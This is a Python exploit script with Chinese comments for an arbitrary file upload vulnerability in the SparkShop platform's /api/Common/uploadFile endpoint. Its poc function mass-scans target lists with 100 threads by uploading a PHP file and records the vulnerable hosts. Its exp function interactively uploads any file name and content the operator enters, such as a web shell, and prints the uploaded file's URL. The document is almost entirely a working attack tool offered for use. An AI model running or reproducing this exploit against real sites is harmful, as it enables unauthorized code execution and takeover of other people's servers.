import requests,json,sys,argparse # 导入模块
from multiprocessing.dummy import Pool # 导入线程池处理多线程
requests.packages.urllib3.disable_warnings() # 关闭警告
def banner ():
    test = """南京SparkShop任意文件上传"""
    print(test) # 打印"""南京SparkShop任意文件上传"""
def main():
    banner() # 调用横幅函数
    parser = argparse.ArgumentParser(description="南京SparkShop任意文件上传漏洞") # 创建解析器处理命令行参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url") # 添加运行url参数
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file") # 添加运行文件参数
    args = parser.parse_args() # 解析命令行参数
    if args.url and not args.file: # 如果指定url,没有指定文件
        if poc(args.url):
            exp(args.url)# 调用poc函数检测指定的url
    elif args.file and not args.url:  # 如果指定文件,没有指定url
        url_list = [] # 创建一个url列表存储读取的url
        with open(args.file, 'r', encoding='utf-8') as f: # 读取文件中的url
            for url in f.readlines():
                url_list.append(url.strip().replace('\n','')) # 替换换行符为空,并添加到列表
        mp = Pool(100)  # 创建一个线程池为100
        mp.map(poc, url_list)  # 将任务分发到线程池中
        mp.close() # 关闭线程池,不再接受新任务
        mp.join() # 等待所有线程完成
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") # 若提供的参数不符合要求,输出用法
def poc(target): # 定义poc函数
    payload1 = '/api/Common/uploadFile'
    headers = {
    "Cache-Control":"max-age=0",
    "Sec-Ch-Ua-Mobile":"?0",
    "Upgrade-Insecure-Requests":"1",
    "Sec-Fetch-Site":"none",
    "Sec-Fetch-Mode":"navigate",
    "Sec-Fetch-User":"?1",
    "Sec-Fetch-Dest":"document",
    "Accept-Encoding":"gzip,deflate,br",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "Priority":"u=0,i",
    "Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
    "Content-Length":"180",
    }
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\nContent-Disposition: form-data; name="file";filename="1.php"\n\n<?php echo"hello world";?>\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try: # 测试输入的url是否在以下漏洞的条件
        res1 = requests.get(url=target,timeout=6, verify=False) # 发送get请求到目标rul,关闭证书
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload1, headers=headers, data=data, timeout=6, verify=False, proxies=proxies)
            if res2.status_code == 200 and "upload success" in res2.text: # 如果"upload success" 在es2.text里
                print(f"[+]{target}存在任意文件上传漏洞")  # 输出存在漏洞
                with open('南京_result.txt', 'a', encoding='utf-8') as f:  # 打开用于存储结果的文件,并追加写入结果
                    f.write(f"{target}存在任意文件上传漏洞\n")
                    return True
            else:
                print(f"[-]{target}不存在任意文件上传漏洞")  # 若不存在输出目标url不存在漏洞
    except Exception as e:
        print(f"{target}可能存在任意文件上传漏洞请手工测试") # 捕获异常，提示可能的问题

def exp(target):
    print("****可以上传文件啦****")
    payload = '/api/Common/uploadFile'
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "176",
    }
    while True:
        filename = input('请输入文件名:')
        code = input('文件内容')
        data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\";filename=\"'+f'{filename}'+'\"\r\n\r\n'+f'{code}'+'\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
        res1 = requests.post(target+payload, data=data, headers=headers, verify=False,timeout=5)
        if res1.status_code == 200 and "upload success" in res1.text:
            json_start = res1.text.find('{')
            if json_start != -1:
                json_str = res1.text[json_start:]
                data = json.loads(json_str)
                url = data['data']['url']
                url1 = url.replace('\\','')
            print(f'{filename}上传成功,请访问{url1}')
            break
        else:
            print(f"[-]{target}不存在任意文件上传漏洞")
if __name__ == '__main__':
    main()